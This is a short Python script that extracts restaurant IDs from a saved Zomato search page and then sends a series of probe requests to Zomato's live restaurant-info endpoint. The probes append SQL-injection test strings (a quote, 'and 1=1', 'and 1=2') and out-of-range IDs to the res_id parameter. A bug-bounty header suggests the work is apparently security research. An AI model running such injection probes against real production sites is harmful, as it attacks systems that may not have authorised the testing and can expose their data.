# -*- coding: utf-8 -*-
"""ET61: extract real res_ids from search html + baseline & perfect-data probe on res_id"""
import re, os, ssl, http.client, time, json

D = os.path.dirname(os.path.abspath(__file__))
html = open(os.path.join(D, "_zomato_search.html"), "r", encoding="utf-8", errors="replace").read()

ids = re.findall(r'"res_id":\s*"?(\d{2,10})', html)
if not ids:
    ids = re.findall(r'/restaurants/[a-z0-9-]+-(\d{2,10})', html)
uniq = []
for i in ids:
    if i not in uniq and i != "1":
        uniq.append(i)
print("== res_ids found: %s ==" % uniq[:8], flush=True)
RID = uniq[0] if uniq else "3"
print("using RID=%s" % RID, flush=True)

ctx = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36"

def get(path, tag=""):
    try:
        conn = http.client.HTTPSConnection("www.zomato.com", 443, timeout=15, context=ctx)
        conn.request("GET", path, headers={"User-Agent": UA, "Accept": "application/json,*/*",
                     "X-Hackerone": "xxbo", "Referer": "https://www.zomato.com/ncr/restaurants?q=pizza"})
        r = conn.getresponse()
        raw = r.read(60000)
        conn.close()
        body = raw.decode("utf-8", "replace")
        print("[%d len=%d] %-70s %s" % (r.status, len(raw), path[:70], body[:130].replace("\n", " ")), flush=True)
    except Exception as e:
        print("[EXC] %-70s %s" % (path[:70], repr(e)[:90]), flush=True)

EP = "/webroutes/restaurant/info"
print("\n== baseline & variants on %s ==" % EP, flush=True)
get(EP + "?res_id=" + RID, "baseline")
time.sleep(0.8)
get(EP + "?res_id=" + RID + "%27", "quote")
time.sleep(0.8)
get(EP + "?res_id=" + RID + "%20and%201=1", "and11")
time.sleep(0.8)
get(EP + "?res_id=" + RID + "%20and%201=2", "and12")
time.sleep(0.8)
get(EP + "?res_id=0", "zero")
time.sleep(0.8)
get(EP + "?res_id=-1", "neg")
time.sleep(0.8)
get(EP + "?res_id=99999999", "big")
time.sleep(0.8)
get(EP + "?res_id=" + RID + ".5", "float")
print("done", flush=True)
